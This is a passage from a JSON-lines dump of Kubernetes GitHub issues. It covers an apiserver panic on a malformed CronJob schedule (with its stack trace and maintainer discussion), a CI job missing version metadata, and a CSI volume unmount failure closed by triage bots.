0x400335c4e0)\n\t\tk8s.io/apiserver/pkg/registry/generic/registry/store.go:451 +0x8c\n\tk8s.io/apiserver/pkg/endpoints/handlers.(*namedCreaterAdapter).Create(0x31a7ce0?, {0x31e0940?, 0x400d07c9f0?}, {0x400e924b40?, 0x31e5760?}, {0x31c1360?, 0x400325a608?}, 0xf94b7cd42c38?, 0x1?)\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:254 +0x48\n\tk8s.io/apiserver/pkg/endpoints/handlers.CreateResource.createHandler.func1.1()\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:184 +0xbc\n\tk8s.io/apiserver/pkg/endpoints/handlers.CreateResource.createHandler.func1.2()\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:209 +0x2dc\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest.func1()\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:117 +0x74\n\tcreated by k8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest in goroutine 70143\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:92 +0xa4\n\n\tgoroutine 70143 [running]:\n\tk8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1.1()\n\t\tk8s.io/apiserver/pkg/server/filters/timeout.go:110 +0xa8\n\tpanic({0x2497fe0?, 0x4011decd90?})\n\t\truntime/panic.go:792 +0x124\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher.(*result).Return(0x4011de50f8?)\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:53 +0xf4\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest({0x31e0940, 0x400d07c9f0}, 0x400335cae0, 0x45d964b800, 0x2da13e8)\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:126 +0x1b8\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher.FinishRequest({0x31e0940?, 0x400d07c9f0?}, 0x31e0940?)\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:84 +0x38\n\tk8s.io/apiserver/pkg/endpoints/handlers.CreateResource.createHandler.func1({0x31d38b0, 0x4011dc4900}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:194 +0x1294\n\tk8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.restfulCreateResource.func16(0x4011dc48e0, 0x4003e5abd0)\n\t\tk8s.io/apiserver/pkg/endpoints/installer.go:1306 +0x5c\n\tk8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.InstrumentRouteFunc.func17(0x4011dc48e0, 0x4003e5abd0)\n\t\tk8s.io/apiserver/pkg/endpoints/metrics/metrics.go:645 +0x15c\n\tgithub.com/emicklei/go-restful/v3.(*Container).dispatch(0x4000f7f440, {0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tgithub.com/emicklei/go-restful/v3@v3.12.2/container.go:299 +0x7e8\n\tgithub.com/emicklei/go-restful/v3.(*Container).Dispatch(...)\n\t\tgithub.com/emicklei/go-restful/v3@v3.12.2/container.go:204\n\tk8s.io/apiserver/pkg/server.director.ServeHTTP({{0x2b7c996?, 0x968f0?}, 0x4000f7f440?, 0x4000482cb0?}, {0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/server/handler.go:145 +0x4a8\n\tk8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP(0x4008014af0?, {0x31dc520?, 0x4011d8fdc0?}, 0x2a?)\n\t\tk8s.io/kube-aggregator/pkg/apiserver/handler_proxy.go:118 +0x1e4\n\tk8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0x400a8fe200, {0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/server/mux/pathrecorder.go:251 +0x348\n\tk8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0x400f76f960?, {0x31dc520?, 0x4011d8fdc0?}, 0x2848cc?)\n\t\tk8s.io/apiserver/pkg/server/mux/pathrecorder.go:237 +0x78\n\tk8s.io/apiserver/pkg/server.director.ServeHTTP({{0x2b7ef0b?, 0x1816b04?}, 0x400212fcb0?, 0x40040e2070?}, {0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/server/handler.go:153 +0x5e8\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func22({0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:108 +0xf4\n\tnet/http.HandlerFunc.ServeHTTP(0x31e0940?, {0x31dc520?, 0x4011d8fdc0?}, 0x4?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/endpoints/filters.withAuthorization.func1({0x31dc520, 0x4011d8fdc0}, 0x4011dc9540)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/authorization.go:84 +0x454\n\tnet/http.HandlerFunc.ServeHTTP(0x20?, {0x31dc520?, 0x4011d8fdc0?}, 0x2b7ae73?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x31dc520, 0x4011d8fdc0}, 0x4011dc9400)\n\t\tk8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:93 +0x34c\n\tnet/http.HandlerFunc.ServeHTTP(0x400ba12508?, {0x31dc520?, 0x4011d8fdc0?}, 0x18168d8?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func23({0x31dc520, 0x4011d8fdc0}, 0x4011dc9400)\n\t\tk8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:108 +0xf4\n\tnet/http.HandlerFunc.ServeHTTP(0x4011d8fec0?, {0x31dc520?, 0x4011d8fdc0?}, 0x14fca28?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle.func10()\n\t\tk8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:298 +0xd4\n\tk8s.io/apiserver/pkg/util/flowcontrol.(*configController).Handle.func2()\n\t\tk8s.io/apiserver/pkg/util/flowcontrol/apf_filter.go:192 +0x1a0\n\tk8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish.func1(0x400cebab40?, 0x29c9540?, 0x400ba12801?)\n\t\tk8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:391 +0x50\n\tk8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish(0x400cebab40, 0x4003e5ab60)\n\t\tk8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:392 +0x3c\n--\n\t\tk8s.io/apimachinery/pkg/util/runtime/runtime.go:132 +0x98\n\tk8s.io/apimachinery/pkg/util/runtime.handleCrash({0x31e03c8, 0x4c67140}, {0x2497fe0, 0x4011decdc0}, {0x4011bb5f58, 0x1, 0x400a12d308?})\n\t\tk8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xe8\n\tk8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x400a12d350, 0x1, 0x400b899c00?})\n\t\tk8s.io/apimachinery/pkg/util/runtime/runtime.go:64 +0x110\n\tpanic({0x2497fe0?, 0x4011decdc0?})\n\t\truntime/panic.go:792 +0x124\n\tk8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP(0x40028f1ec0, {0x31d38b0, 0x4011dc4440}, 0xdf8475800?)\n\t\tk8s.io/apiserver/pkg/server/filters/timeout.go:121 +0x2a0\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestDeadline.withRequestDeadline.func28({0x31d38b0, 0x4011dc4440}, 0x4011dc8500)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/request_deadline.go:100 +0x1a0\n\tnet/http.HandlerFunc.ServeHTTP(0x31e0940?, {0x31d38b0?, 0x4011dc4440?}, 0x2517680?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWaitGroup.withWaitGroup.func29({0x31d38b0, 0x4011dc4440}, 0x4011dc8500)\n\t\tk8s.io/apiserver/pkg/server/filters/waitgroup.go:86 +0x140\n\tnet/http.HandlerFunc.ServeHTTP(0x400c279050?, {0x31d38b0?, 0x4011dc4440?}, 0x2b846c5?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithCacheControl.func14({0x31d38b0, 0x4011dc4440}, 0x4011dc8500)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/cachecontrol.go:31 +0xa8\n\tnet/http.HandlerFunc.ServeHTTP(0xf94bc4014108?, {0x31d38b0?, 0x4011dc4440?}, 0x4011dc4440?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithHTTPLogging.WithLogging.withLogging.func35({0x31d38b0, 0x4011dc4440}, 0x4011dc8500)\n\t\tk8s.io/apiserver/pkg/server/httplog/httplog.go:112 +0x78\n\tnet/http.HandlerFunc.ServeHTTP(0x31e0a98?, {0x31d38b0?, 0x4011dc4440?}, 0x4011dc83c0?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithLatencyTrackers.func16({0x31d3b20, 0x4011bb54c8}, 0x4011dc83c0)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/webhook_duration.go:56 +0x120\n\tnet/http.HandlerFunc.ServeHTTP(0x4011dc8280?, {0x31d3b20?, 0x4011bb54c8?}, 0x2522c?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestInfo.func18({0x31d3b20, 0x4011bb54c8}, 0x4011dc8280)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/requestinfo.go:39 +0x108\n\tnet/http.HandlerFunc.ServeHTTP(0x4011dc8140?, {0x31d3b20?, 0x4011bb54c8?}, 0x5bc0abbe6f?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestReceivedTimestamp.withRequestReceivedTimestampWithClock.func32({0x31d3b20, 0x4011bb54c8}, 0x4011dc8140)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/request_received_time.go:38 +0xac\n\tnet/http.HandlerFunc.ServeHTTP(0x400009b008?, {0x31d3b20?, 0x4011bb54c8?}, 0x2522c?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithMuxAndDiscoveryComplete.func19({0x31d3b20?, 0x4011bb54c8?}, 0x4011dc8140?)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/mux_discovery_complete.go:52 +0xd0\n\tnet/http.HandlerFunc.ServeHTTP(0x64492d7469647541?, {0x31d3b20?, 0x4011bb54c8?}, 0x8?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithPanicRecovery.withPanicRecovery.func33({0x31d3b20, 0x4011bb54c8}, 0x4011dc8140)\n\t\tk8s.io/apiserver/pkg/server/filters/wrap.go:73 +0xd8\n\tnet/http.HandlerFunc.ServeHTTP(0x400c279050?, {0x31d3b20?, 0x4011bb54c8?}, 0x4011da6ba0?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAuditInit.withAuditInit.func34({0x31d3b20, 0x4011bb54c8}, 0x4011dc8000)\n\t\tk8s.io/apiserver/pkg/endpoints/filters/audit_init.go:63 +0x10c\n\tnet/http.HandlerFunc.ServeHTTP(0x40040e60f0?, {0x31d3b20?, 0x4011bb54c8?}, 0x40040e60c0?)\n\t\tnet/http/server.go:2294 +0x38\n\tk8s.io/apiserver/pkg/server.(*APIServerHandler).ServeHTTP(0x400b071000?, {0x31d3b20?, 0x4011bb54c8?}, 0x58e164?)\n\t\tk8s.io/apiserver/pkg/server/handler.go:188 +0x30\n\tnet/http.serverHandler.ServeHTTP({0x400b071000?}, {0x31d3b20?, 0x4011bb54c8?}, 0xf94b7cb671b0?)\n\t\tnet/http/server.go:3301 +0xbc\n\tnet/http.initALPNRequest.ServeHTTP({{0x31e0940?, 0x400bb2b1a0?}, 0x400abb9c08?, {0x4000dc4600?}}, {0x31d3b20, 0x4011bb54c8}, 0x4011dc8000)\n\t\tnet/http/server.go:3974 +0x1b4\n\tgolang.org/x/net/http2.(*serverConn).runHandler(0x4c67140?, 0x0?, 0x0?, 0x4003986fb0?)\n\t\tgolang.org/x/net@v0.38.0/http2/server.go:2433 +0xe8\n\tcreated by golang.org/x/net/http2.(*serverConn).scheduleHandler in goroutine 69955\n\t\tgolang.org/x/net@v0.38.0/http2/server.go:2367 +0x208\n >\nE0928 08:07:51.393163       1 wrap.go:57] \"apiserver panic'd\" method=\"POST\" URI=\"/apis/batch/v1/namespaces/default/cronjobs?fieldManager=kubectl-client-side-apply&fieldValidation=Strict\" auditID=\"f6a85ccd-773b-4375-9af1-13429d7220c0\"\nhttp2: panic serving 172.18.0.1:53268: runtime error: slice bounds out of range [:-1]\ngoroutine 70144 [running]:\nk8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest.func1.1()\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:105 +0x98\npanic({0x2907bc0?, 0x4009b9d110?})\n\truntime/panic.go:792 +0x124\ngithub.com/robfig/cron/v3.Parser.Parse({0x4011dd3701?}, {0x4011df4e30, 0x4})\n\tgithub.com/robfig/cron/v3@v3.0.1/parser.go:99 +0x5cc\ngithub.com/robfig/cron/v3.ParseStandard(...)\n\tgithub.com/robfig/cron/v3@v3.0.1/parser.go:230\nk8s.io/kubernetes/pkg/apis/batch/validation.validateScheduleFormat({0x4011df4e30, 0x4}, 0x0, 0x0, 0x400d0bf590)\n\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:793 +0x48\nk8s.io/kubernetes/pkg/apis/batch/validation.validateCronJobSpec(0x400325a710, 0x0, 0x400d0bf560, {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...})\n\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:750 +0x9ec\nk8s.io/kubernetes/pkg/apis/batch/validation.ValidateCronJobCreate(0x400325a608, {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, ...})\n\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:718 +0xc4\nk8s.io/kubernetes/pkg/registry/batch/cronjob.cronJobStrategy.Validate({{0xf94b7cd42c38?, 0x2b6c3f2?}, {0x4011dd3a38?, 0x13e9944?}}, {0x4011dd3a38?, 0x13e98a4?}, {0x31c1360?, 0x400325a608})\n\tk8s.io/kubernetes/pkg/registry/batch/cronjob/strategy.go:115 +0x74\nk8s.io/apiserver/pkg/registry/rest.BeforeCreate({0x31f1768, 0x4002558ee0}, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608})\n\tk8s.io/apiserver/pkg/registry/rest/create.go:122 +0x188\nk8s.io/apiserver/pkg/registry/generic/registry.(*Store).create(0x4000f28180, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608}, 0x4011dcb140, 0x400335c4e0)\n\tk8s.io/apiserver/pkg/registry/generic/registry/store.go:501 +0x19c\nk8s.io/apiserver/pkg/registry/generic/registry.(*Store).Create(0x4000f28180, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608}, 0x4011dcb140, 0x400335c4e0)\n\tk8s.io/apiserver/pkg/registry/generic/registry/store.go:451 +0x8c\nk8s.io/apiserver/pkg/endpoints/handlers.(*namedCreaterAdapter).Create(0x31a7ce0?, {0x31e0940?, 0x400d07c9f0?}, {0x400e924b40?, 0x31e5760?}, {0x31c1360?, 0x400325a608?}, 0xf94b7cd42c38?, 0x1?)\n\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:254 +0x48\nk8s.io/apiserver/pkg/endpoints/handlers.CreateResource.createHandler.func1.1()\n\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:184 +0xbc\nk8s.io/apiserver/pkg/endpoints/handlers.CreateResource.createHandler.func1.2()\n\tk8s.io/apiserver/pkg/endpoints/handlers/create.go:209 +0x2dc\nk8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest.func1()\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:117 +0x74\ncreated by k8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest in goroutine 70143\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:92 +0xa4\n\n```\n\n\n### Anything else we need to know?\n\npanic occurs in https://github.com/kubernetes/kubernetes/blob/master/pkg/apis/batch/validation/validation.go#L793\nand the root cause can be found in https://github.com/robfig/cron/issues/554\n\ncan consider handle this error within Kubernetes. Perhaps we should recover the panic within the panic function rather than relying on controller runtime.HandleCrash mechanism? This panic shouldn't be returned to the client.\n\n\n### Kubernetes version\n\n<details>\n\n```console\nClient Version: v1.27.4\nKustomize Version: v5.0.1\nServer Version: v1.34.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "sig/apps", "triage/accepted"], "comments": [{"author": "PersistentJZH", "body": "/assign\n/sig api-machinery\n"}, {"author": "ardaguclu", "body": "/sig apps"}, {"author": "artschur", "body": "/assign"}, {"author": "artschur", "body": "HI @PersistentJZH, im a new contributor and assigned myself to the issue you were already assigned without knowing it would affect you.\n\nSorry for the unassignment! Ill remove my assignement here."}, {"author": "artschur", "body": "/unassign\n"}, {"author": "PersistentJZH", "body": "/assign"}, {"author": "soltysh", "body": "Let's see if we can get https://github.com/robfig/cron/pull/555 landed, given that there hasn't been much activity in that library for a while. If not, I'm fine addressing this problem on our side. "}, {"author": "soltysh", "body": "/triage accepted"}, {"author": "liggitt", "body": "Just for clarity, the API server doesn't *exit* on the panic, right? (it is recovered and handled for the particular request)"}, {"author": "PersistentJZH", "body": "> Just for clarity, the API server doesn't _exit_ on the panic, right? (it is recovered and handled for the particular request)\n\nYes, apiserver will not exit on the panic, and will be recovered through runtime.HandleCrash.\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134405, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134405", "issue_title": "capz-windows-master job does not report tested kubernetes version", "issue_author": "BenTheElder", "issue_body": "This makes it much harder to determine if a kubernetes regression was involved in test failures.\n\nJobs that report the tested version allow dragging between the passing/failing runs to launch a github diff link.\n\nThis metadata is missing for the CAPZ job, you can only find the versions by digging through the logs.\n\n\n/sig windows\n/kind bug\n\npointers in https://github.com/kubernetes/kubernetes/issues/134354#issuecomment-3363389023", "issue_labels": ["kind/bug", "sig/windows", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "marosset", "body": "/assign"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131232, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131232", "issue_title": "kubernetes.io/csi: unmounter failed, because of the vol_data.json: no such file or directory", "issue_author": "Black-max12138", "issue_body": "### What happened?\n\nWhen the csi interface is invoked to attach a volume, if the volume fails to be attached, the removeMountDir method is invoked to clear the directory where the volume is attached. If the pod is deleted, the csi volume fails to be attached, and a message is displayed indicating that the volume fails to be detached. The cause is that the vol_data.json file does not exist.\nThe code for mount a volume is as follows:\nhttps://github.com/kubernetes/kubernetes/blob/88dfcb225d41326113990e87b11137641c121a32/pkg/volume/csi/csi_mounter.go#L300-L323\n\nThe NewUnmounter method is invoked to detach a volume. The vol_data.json file needs to be read. The code is as follows:\nhttps://github.com/kubernetes/kubernetes/blob/88dfcb225d41326113990e87b11137641c121a32/pkg/volume/csi/csi_plugin.go#L556-L559\n\nThe log is as follows:\nE0120 10:53:49.870240 4083505 nestedpendingoperations.go:348] Operation for \"{volumeName:kubernetes.io/csi/31c052e2-63f5-4127-95cb-0923db30dd5a-dump podName:31c052e2-63f5-4127-95cb-0923db30dd5a nodeName:}\" failed. No retries permitted until 2025-01-20 10:53:50.370182329 +0000 UTC m=+5.022372153 (durationBeforeRetry 500ms). Error: MountVolume.SetUp failed for volume \"dump\" (UniqueName: \"kubernetes.io/csi/31c052e2-63f5-4127-95cb-0923db30dd5a-dump\") pod \"ndp-spark-history-0\" (UID: \"31c052e2-63f5-4127-95cb-0923db30dd5a\") : rpc error: code = Unavailable desc = connection error: desc = \"transport: Error while dialing: dial unix /var/lib/kubelet/plugins_registry/sop-csi-driver-reg.sock: connect: resource temporarily unavailable\"\n\nE0120 13:16:00.518419 4083505 reconciler_common.go:169] \"operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled true) for volume \\\"dump\\\" (UniqueName: \\\"kubernetes.io/csi/31c052e2-63f5-4127-95cb-0923db30dd5a-dump\\\") pod \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\" (UID: \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\") : UnmountVolume.NewUnmounter failed for volume \\\"dump\\\" (UniqueName: \\\"kubernetes.io/csi/31c052e2-63f5-4127-95cb-0923db30dd5a-dump\\\") pod \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\" (UID: \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/vol_data.json]: open /var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/vol_data.json: no such file or directory\" err=\"UnmountVolume.NewUnmounter failed for volume \\\"dump\\\" (UniqueName: \\\"kubernetes.io/csi/31c052e2-63f5-4127-95cb-0923db30dd5a-dump\\\") pod \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\" (UID: \\\"31c052e2-63f5-4127-95cb-0923db30dd5a\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/vol_data.json]: open /var/lib/kubelet/pods/31c052e2-63f5-4127-95cb-0923db30dd5a/volumes/kubernetes.io~csi/dump/vol_data.json: no such file or directory\"\n\n### What did you expect to happen?\n\nVolumes that fail to be mounted can also be unmounted successfully.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nSimulate a scenario in which a volume fails to be attached to the CSI and the vol_data.json file is deleted. After the volume fails to be mounted, the volume is unmounted.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n1.31\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "carlory", "body": "/sig storage"}, {"author": "silence-coding", "body": "For the scenario of the \"connect: resource temporarily unavailable\" error, should we retry it like we do with the rate limiting returned by the csidriver? This is because it is also an error similar to rate limiting at the operating system level."}, {"author": "Black-max12138", "body": "I don't think this will solve the current issue.[#131311](https://github.com/kubernetes/kubernetes/pull/131311) @wwthw"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "wwthw", "body": "\u00a0\n\u60a8\u597d\uff0c\u6211\u662f\u738b\u6587\u6d9b\uff0c\u60a8\u7684\u90ae\u4ef6\u6211\u5df2\u6536\u5230\uff0c\u6211\u4f1a\u5c3d\u5feb\u7ed9\u4e88\u56de\u590d\u7684\uff0c\u8c22\u8c22~~~~~"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131232#issuecomment-3389031690):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "wwthw", "body": "\u00a0\n\u60a8\u597d\uff0c\u6211\u662f\u738b\u6587\u6d9b\uff0c\u60a8\u7684\u90ae\u4ef6\u6211\u5df2\u6536\u5230\uff0c\u6211\u4f1a\u5c3d\u5feb\u7ed9\u4e88\u56de\u590d\u7684\uff0c\u8c22\u8c22~~~~~"}]}
